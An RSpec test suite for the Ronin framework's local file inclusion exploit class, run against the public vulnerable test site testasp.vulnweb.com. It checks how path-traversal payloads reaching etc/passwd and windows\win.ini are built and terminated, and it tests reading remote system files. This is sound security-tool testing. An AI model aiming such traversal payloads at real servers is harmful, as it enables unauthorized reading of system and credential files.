require 'spec_helper'
require 'ronin/exploits/lfi'

describe Exploits::LFI do
  let(:host)          { 'testasp.vulnweb.com' }
  let(:path)          { '/Templatize.asp' }
  let(:query)         { 'item=html/about.html' }
  let(:query_param)   { 'item' }

  let(:exploit) do
    described_class.new(
      host:            host,
      url_path:        path,
      url_query:       query,
      url_query_param: {name: query_param}
    )
  end
  subject { exploit }

  describe "#leading" do
    it "should default to false" do
      expect(subject.leading).to be_false
    end
  end

  describe "#traversal" do
    it "should default to the maximum traversal" do
      expect(subject.traversal).to eq(described_class::MAX_TRAVERSAL)
    end
  end

  describe "#terminate" do
    it "should default to false" do
      expect(subject.terminate).to be_false
    end
  end

  describe "#platform" do
    it "should default to :unix" do
      expect(subject.platform).to eq(:unix)
    end
  end

  describe "#path_separator" do
    subject { exploit.path_separator }

    it { should == '/' }

    context "on Windows platforms" do
      before { exploit.platform = :windows }

      it { should == "\\" }
    end
  end

  describe "#escape_path" do
    let(:local_path) { 'etc/passwd' }

    it "should traverse up n directories" do
      escaped_path = subject.escape_path(local_path)

      expect(escaped_path).to be_end_with(('../' * subject.traversal) + local_path)
    end

    context "with leading separator" do
      before { subject.leading = true }

      it "should prepend a directory separator too the path" do
        escaped_path = subject.escape_path(local_path)

        expect(escaped_path).to be_end_with('/' + ('../' * subject.traversal) + local_path)
      end
    end

    context "with terminated paths" do
      before { subject.terminate = true }

      it "should terminating the path with a %0 character" do
        escaped_path = subject.escape_path(local_path)

        expect(escaped_path).to be_end_with("#{local_path}%0")
      end
    end

    context "on Windows platforms" do
      let(:local_path) { 'windows\win.ini' }

      before { subject.platform = :windows }

      it "should traverse up n directories" do
        escaped_path = subject.escape_path(local_path)

        expect(escaped_path).to be_end_with(("..\\" * subject.traversal) + local_path)
      end

      context "with leading separator" do
        before { subject.leading = true }

        it "should prepend a directory separator too the path" do
          escaped_path = subject.escape_path(local_path)

          expect(escaped_path).to be_end_with("\\" + ("..\\" * subject.traversal) + local_path)
        end
      end

      context "with terminated paths" do
        before { subject.terminate = true }

        it "should terminating the path with a %0 character" do
          escaped_path = subject.escape_path(local_path)

          expect(escaped_path).to be_end_with("#{local_path}%0")
        end
      end
    end
  end

  describe "#exploit_url" do
    let(:local_path)   { 'etc/passwd' }
    let(:escaped_path) { subject.escape_path(local_path) }

    it "should set the query_param to the escaped path" do
      uri = subject.exploit_url(local_path)

      expect(uri.query_params[query_param]).to eq(escaped_path)
    end
  end

  describe "#test_file", network: true do
    let(:local_path) { 'windows\system.ini' }
    let(:pattern)    { /\[driver32\]/ }

    before { subject.platform = :windows }

    it "should test if a local file can be included in the body" do
      expect(subject.test_file(local_path,pattern)).to be_true
    end
  end

  describe "#vulnerable?", network: true do
    it "should test known files for each platform" do
      expect(subject).to be_vulnerable
    end

    it "should detect the platform" do
      subject.vulnerable?

      expect(subject.platform).to eq(:windows)
    end
  end

  describe "#fs_readfile", network: true do
    let(:local_path) { 'windows\win.ini' }
    let(:expected)   {
      "[Mail]\r\nMAPI=1\r\n[MCI Extensions.BAK]\r\naif=MPEGVideo\r\naifc=MPEGVideo\r\naiff=MPEGVideo\r\nasf=MPEGVideo\r\nasx=MPEGVideo\r\nau=MPEGVideo\r\nm1v=MPEGVideo\r\nm3u=MPEGVideo\r\nmp2=MPEGVideo\r\nmp2v=MPEGVideo\r\nmp3=MPEGVideo\r\nmpa=MPEGVideo\r\nmpe=MPEGVideo\r\nmpeg=MPEGVideo\r\nmpg=MPEGVideo\r\nmpv2=MPEGVideo\r\nsnd=MPEGVideo\r\nwax=MPEGVideo\r\nwm=MPEGVideo\r\nwma=MPEGVideo\r\nwmv=MPEGVideo\r\nwmx=MPEGVideo\r\nwpl=MPEGVideo\r\nwvx=MPEGVideo\r\n"
    }

    before { subject.platform = :windows }

    it "should extract the file from the response" do
      file = subject.fs_readfile(local_path)

      expect(file).to eq(expected)
    end

    context "when requesting missing files" do
      let(:bad_path) { 'nope' }

      it "should raise a Errno::ENOENT exception" do
        expect {
          subject.fs_readfile(bad_path)
        }.to raise_error(Errno::ENOENT)
      end
    end
  end
end
